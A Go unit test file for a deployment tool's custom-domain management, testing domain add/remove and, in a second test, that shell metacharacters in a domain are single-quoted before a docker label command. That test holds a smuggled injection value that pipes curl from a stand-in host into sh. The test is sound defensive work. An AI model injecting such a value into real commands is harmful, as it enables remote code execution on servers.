package usecases

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/Dall06/tarhiata-ops/srv/sys/domain"
	"github.com/Dall06/tarhiata-ops/srv/sys/repositories"
	"github.com/Dall06/tarhiata-ops/srv/sys/tests/mocks"
)

func TestManageDomainsUseCase_AddAndRemove(t *testing.T) {
	tmpDir, err := os.MkdirTemp("", "tarhiata_domains_test")
	if err != nil {
		t.Fatalf("failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tmpDir)

	dbPath := filepath.Join(tmpDir, "test.db")
	repo, err := repositories.NewSQLiteRepository(dbPath)
	if err != nil {
		t.Fatalf("failed sqlite init: %v", err)
	}
	defer repo.Close()

	// Seed test service
	repo.SaveService(domain.SavedService{
		Name:      "web-app",
		Domain:    "myapp.com",
		Expose:    true,
		EnableSSL: true,
	})

	mockSSH := mocks.NewMockSSHExecutor()
	uc := NewManageDomainsUseCase(repo, mockSSH)

	config := domain.ServerConfig{Host: "127.0.0.1"}

	// Add custom domain
	err = uc.AddCustomDomain("web-app", "www.myapp.com", "myapp.com", config)
	if err != nil {
		t.Fatalf("unexpected error adding custom domain: %v", err)
	}

	info, err := uc.GetServiceDomains("web-app", "")
	if err != nil {
		t.Fatalf("unexpected error getting domains: %v", err)
	}
	if info.PrimaryDomain != "myapp.com" {
		t.Errorf("expected primary domain myapp.com, got %s", info.PrimaryDomain)
	}
	if len(info.Rules) != 1 || info.Rules[0].Domain != "www.myapp.com" {
		t.Errorf("expected custom domain www.myapp.com, got %v", info.Rules)
	}

	// Remove custom domain
	err = uc.RemoveCustomDomain("web-app", "www.myapp.com", config)
	if err != nil {
		t.Fatalf("unexpected error removing custom domain: %v", err)
	}

	info2, errGet2 := uc.GetServiceDomains("web-app", "")
	if errGet2 != nil {
		t.Fatalf("unexpected error getting domains after removal: %v", errGet2)
	}
	if len(info2.Rules) != 0 {
		t.Errorf("expected 0 custom domains after removal, got %d", len(info2.Rules))
	}
}

// TestManageDomainsUseCase_ShellInjectionPrevention valida el flujo completo de
// AddCustomDomain: un dominio con comillas/metacaracteres de shell debe llegar
// citado (single-quoted) al "docker service update --label-add" real.
func TestManageDomainsUseCase_ShellInjectionPrevention(t *testing.T) {
	tmpDir, err := os.MkdirTemp("", "tarhiata_domains_inj_test")
	if err != nil {
		t.Fatalf("failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tmpDir)

	repo, err := repositories.NewSQLiteRepository(filepath.Join(tmpDir, "test.db"))
	if err != nil {
		t.Fatalf("failed sqlite init: %v", err)
	}
	defer repo.Close()

	if err := repo.SaveService(domain.SavedService{Name: "web-app", Domain: "myapp.com"}); err != nil {
		t.Fatalf("failed seeding service: %v", err)
	}

	mockSSH := mocks.NewMockSSHExecutor()
	uc := NewManageDomainsUseCase(repo, mockSSH)
	config := domain.ServerConfig{Host: "127.0.0.1"}

	const evilDomain = `x" ; curl http://evil|sh ; echo "`
	if err := uc.AddCustomDomain("web-app", evilDomain, "", config); err != nil {
		t.Fatalf("unexpected error adding custom domain: %v", err)
	}

	got := mockSSH.CommandsExecuted[len(mockSSH.CommandsExecuted)-1]
	if strings.Contains(got, `--label-add "`) {
		t.Errorf("el label no debería usar comillas dobles sin escapar: %s", got)
	}
	if !strings.Contains(got, `--label-add 'traefik.http.routers.web-app.rule=Host(`) {
		t.Errorf("comando inseguro, falta citar el label con comillas simples: %s", got)
	}
}
